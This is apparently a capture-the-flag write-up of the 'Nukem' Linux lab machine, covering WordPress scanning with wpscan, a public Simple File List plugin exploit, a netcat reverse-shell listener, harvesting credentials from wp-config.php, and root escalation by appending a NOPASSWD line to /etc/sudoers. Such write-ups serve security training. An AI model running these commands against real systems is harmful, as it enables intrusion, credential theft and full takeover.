# 💣 Nukem (Linux)

## 🔍 Initial Foothold

- Discovered a WordPress site running on port 80 at `http://192.168.215.105`.
- Ran `wpscan` with API token to identify vulnerabilities:

```bash
wpscan --update
wpscan --url http://192.168.215.105 --api-token <your_token>
```

- Found vulnerable plugin: **Simple File List**.
- Modified and used the following exploit:  
  🔗 [`Simple File List Exploit - ID 48979`](https://www.exploit-db.com/exploits/48979)

```bash
python3 48979.py http://192.168.215.105/
```

- Started a reverse shell listener:

```bash
sudo nc -nlvp 80
```

- Reverse shell received! 🐚

---

## 📦 Post Exploitation

- Navigated through directories and found `wp-config.php`:
```bash
cat wp-config.php
```

- Extracted **Commander** user credentials from config.

---

## 🚀 Privilege Escalation

- Targeted `dosbox` binary using the third method from this article:  
  🔗 [PG Nukem - Medium](https://medium.com/@ardian.danny/oscp-practice-series-64-proving-grounds-30964bed6cf3)

- Attempted 3 escalation methods:
  1. Adding SSH public key to `authorized_keys` ❌
  2. Modifying `/etc/passwd` ❌
  3. ✅ Modified `/etc/sudoers` and added `commander` with full sudo rights:

```bash
echo 'commander ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

- Switched to root:

```bash
sudo su
```

- 🏁 Got root shell!

---

## 🧠 Key Takeaways

- 🔎 `wpscan` + API = powerful WordPress enumeration
- 🧠 Always check for plugin exploits using `searchsploit`
- 📜 Exploit configuration files like `wp-config.php` for creds
- 💥 Privilege escalation using SUID binaries like `dosbox` is potent
- 🛡️ Abuse `/etc/sudoers` with caution — instant root if writable

